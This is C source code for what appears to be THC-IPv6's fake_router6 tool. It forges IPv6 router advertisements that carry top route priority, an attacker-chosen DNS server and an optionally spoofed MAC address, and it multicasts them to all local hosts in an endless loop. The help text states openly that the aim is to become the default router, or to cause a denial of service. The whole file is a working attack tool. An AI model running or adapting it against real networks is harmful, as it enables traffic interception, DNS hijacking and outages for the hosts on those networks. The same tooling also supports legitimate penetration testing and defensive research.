#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

extern int debug;

void help(char *prg) {
  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-r] interface network-address/prefix-length [dns-server [router-ip-link-local [mtu [mac-address]]]]\n\n", prg);
  printf("Announce yourself as a router and try to become the default router.\n");
  printf("If a non-existing link-local or mac address is supplied, this results in a DOS.\n");
  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *routerip, *interface, mac[6] = "";
  unsigned char *routerip6, *route6, *mac6 = mac, *ip6;
  unsigned char buf[256], *ptr;
  unsigned char *dst = thc_resolve6("FF02::1");
  unsigned char *dstmac = thc_get_multicast_mac(dst);
  unsigned char *dns;
  int size, mtu = 1500, i, j, k;
  unsigned char *pkt = NULL;
  int pkt_len = 0;
  int rawmode = 0;
  
  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0)
    help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  memset(mac, 0, sizeof(mac));
  interface = argv[1];
  if (argc >= 6)
    mtu = atoi(argv[5]);
  if (argc >= 7 && (ptr = argv[6]) != NULL)
    sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int*)&mac[0], (unsigned int*)&mac[1], (unsigned int*)&mac[2], (unsigned int*)&mac[3], (unsigned int*)&mac[4], (unsigned int*)&mac[5]);
  else
    mac6 = thc_get_own_mac(interface);

  if (argc >= 5 && argv[4] != NULL)
    ip6 = thc_resolve6(argv[4]);
  else
    ip6 = thc_get_own_ipv6(interface, NULL, PREFER_LINK);

  if (argc >= 4 && argv[3] != NULL)
    dns = thc_resolve6(argv[3]);
  else
    dns = thc_resolve6("FF02::FB");

  routerip = argv[2];
  if ((ptr = index(routerip, '/')) == NULL) {
    printf("Error: Option must be supplied as IP-ADDRESS/PREFIXLENGTH, e.g. ff80::01/16\n");
  }
  *ptr++ = 0;
  size = atoi(ptr);
  
  routerip6 = thc_resolve6(routerip);
  route6 = thc_resolve6(routerip);
  
  if (routerip6 == NULL || size < 1 || size > 128) {
    fprintf(stderr, "Error: IP-ADDRESS/PREFIXLENGTH argument is invalid: %s\n", argv[2]);
    exit(-1);
  }
  if (size < 48 || size > 64)
    fprintf(stderr, "Warning: unusual network prefix size defined, be sure what your are doing: %d\n", size);
  if (dns == NULL) {
    fprintf(stderr, "Error: dns argument is invalid: %s\n", argv[3]);
    exit(-1);
  }
  if (ip6 == NULL) {
    fprintf(stderr, "Error: link-local-ip6 argument is invalid: %s\n", argv[4]);
    exit(-1);
  }
  if (mtu < 1 || mtu > 65536) {
    fprintf(stderr, "Error: mtu argument is invalid: %s\n", argv[5]);
    exit(-1);
  }
  if (mtu < 1228 || mtu > 1500)
    fprintf(stderr, "Warning: unusual mtu size defined, be sure what you are doing :%d\n", mtu);
  if (mac6 == NULL) {
    fprintf(stderr, "Error: mac address in invalid\n");
    exit(-1);
  }
  
  i = 128 - size;
  j = i / 8;
  k = i % 8;
  if (k > 0)
    j++;
  memset(route6 + 16 - j, 0, j);
  if (k > 0)
    route6[17 - j] = (route6[17 - j] >> (8 - k)) << (8 - k);

  memset(buf, 0, sizeof(buf));
//  buf[3] = 250; // 0-3: reachable timer
  buf[6] = 4; // 4-7: retrans timer
  // option mtu
  buf[8] = 5;
  buf[9] = 1;
  buf[12] = mtu / 16777216;
  buf[13] = (mtu % 16777216) / 65536;
  buf[14] = (mtu % 65536) / 256;
  buf[15] = mtu % 256;
  // option prefix
  buf[16] = 3;
  buf[17] = 4;
  buf[18] = size; // prefix length
  buf[19] = 128 + 64;
  memset(&buf[20], 17, 4);
  memset(&buf[24], 4, 4);
  memcpy(&buf[32], route6, 16);

  i = 48;
  // mac address option
  buf[i++] = 1;
  buf[i++] = 1;
  memcpy(buf+i, mac6, 6);
  i += 6;

  // default route routing option
  buf[i++] = 0x18; // routing entry option type
  buf[i++] = 0x03; // length 3 == 24 bytes
  buf[i++] = 0x00; // prefix length
  buf[i++] = 0x08; // priority, highest of course
  i += 2; // 52-53 unknown
  buf[i++] = 0x11; // lifetime, word
  buf[i++] = 0x11; // lifetime, word
  i += 16; // 56-71 address, all zeros for default

  // dns option
  buf[i++] = 0x19; // dns option type
  buf[i++] = 0x03;  // length
  i += 2; // 74-75 reserved
  memset(buf + i, 1, 4); // validity time
  i += 4;
  memcpy(buf + i, dns, 16); // dns server
  i += 16;

  if ((pkt = thc_create_ipv6(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0xe0, 0)) == NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff080800, buf, i, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0)
    return -1;

  printf("Starting to advertise router %s (Press Control-C to end) ...\n", argv[2]);
  while (1) {
    thc_send_pkt(interface, pkt, &pkt_len);
    sleep(5);
  }
  return 0;
}
